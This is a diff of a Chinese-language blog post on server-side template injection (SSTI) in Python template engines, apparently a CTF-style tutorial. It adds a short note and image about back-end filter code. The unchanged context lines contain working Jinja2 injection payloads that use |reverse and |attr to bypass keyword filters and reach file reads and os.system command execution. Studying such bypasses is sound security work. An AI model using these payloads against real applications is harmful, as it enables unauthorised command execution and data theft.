@@ -53,8 +53,9 @@
 <meta property="og:image" content="https://i.loli.net/2020/02/24/jw7sStYhX534kTa.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/VhvMFANZCy7m9fz.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/WAyTklhRX4iYeOa.png">
+<meta property="og:image" content="https://i.loli.net/2020/03/02/zcjwfxstTpdqekr.png">
 <meta property="article:published_time" content="2020-02-24T01:11:15.000Z">
-<meta property="article:modified_time" content="2020-02-27T10:55:16.421Z">
+<meta property="article:modified_time" content="2020-03-02T02:39:10.765Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="SSTI">
 <meta name="twitter:card" content="summary">
@@ -391,6 +392,10 @@
 <p>这里突然意识到文章前面都没有提到过滤器，而在模版引擎中过滤器也有很多szs</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#比如flag被过滤，|reverse</span><br><span class="line">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;galf&#39;|reverse).read()</span><br><span class="line">#比如getattr被过滤，|attr</span><br><span class="line">(&#39;&#39;|attr(&#39;__class__&#39;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line">#names|last，取序列最后一个元素等等</span><br></pre></td></tr></table></figure>
 
+<p>=======================分割线</p>
+<p>有时候后端代码过滤代码可能是这样的</p>
+<p><img src="https://i.loli.net/2020/03/02/zcjwfxstTpdqekr.png" alt="Snipaste_2020-03-02_10-36-51.png"></p>
+<p><code>open (&#39;&#39;)</code></p>
 <p>=======================分割线</p>
 <hr>
 <h4><span id="参考链接">参考链接：</span></h4><p> <a href="http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/" target="_blank" rel="noopener">http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/</a> </p>
